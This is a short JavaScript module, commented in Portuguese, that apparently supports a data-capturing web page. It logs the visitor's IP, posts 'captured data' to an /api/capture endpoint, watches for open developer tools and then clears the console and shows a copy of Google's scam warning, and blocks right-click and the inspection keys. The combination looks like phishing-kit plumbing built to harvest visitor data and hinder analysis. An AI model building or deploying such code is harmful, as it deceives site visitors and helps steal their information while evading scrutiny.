// Função para obter IP do usuário
export async function getUserIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json')
        const data = await response.json()
        return data.ip
    } catch (error) {
        console.log('Erro ao obter IP:', error)
        return 'Não disponível'
    }
}

// Função para enviar dados capturados
export async function sendCapturedData(data) {
    try {
        const response = await fetch('/api/capture', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data)
        })
        
        if (response.ok) {
            console.log('Dados enviados com sucesso')
        } else {
            console.error('Erro ao enviar dados')
        }
    } catch (error) {
        console.error('Erro na requisição:', error)
    }
}

// Função para detectar tentativas de inspeção
export function detectDevTools() {
    let devtools = {
        open: false,
        orientation: null
    }
    
    const threshold = 160
    
    setInterval(() => {
        if (window.outerHeight - window.innerHeight > threshold || 
            window.outerWidth - window.innerWidth > threshold) {
            if (!devtools.open) {
                devtools.open = true
                console.clear()
                console.log('%cPARAR!', 'color: red; font-size: 50px; font-weight: bold;')
                console.log('%cEste é um recurso do navegador destinado a desenvolvedores. Se alguém disse para você copiar e colar algo aqui para ativar um recurso do Google ou "hackear" a conta de alguém, trata-se de um golpe e essa pessoa terá acesso à sua conta do Google.', 'color: red; font-size: 16px;')
            }
        } else {
            devtools.open = false
        }
    }, 500)
}

// Prevenir clique direito e teclas de desenvolvedor
export function setupSecurity() {
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault()
    })

    document.addEventListener('keydown', function(e) {
        // F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
        if (e.keyCode === 123 || 
            (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) ||
            (e.ctrlKey && e.keyCode === 85)) {
            e.preventDefault()
            return false
        }
    })
}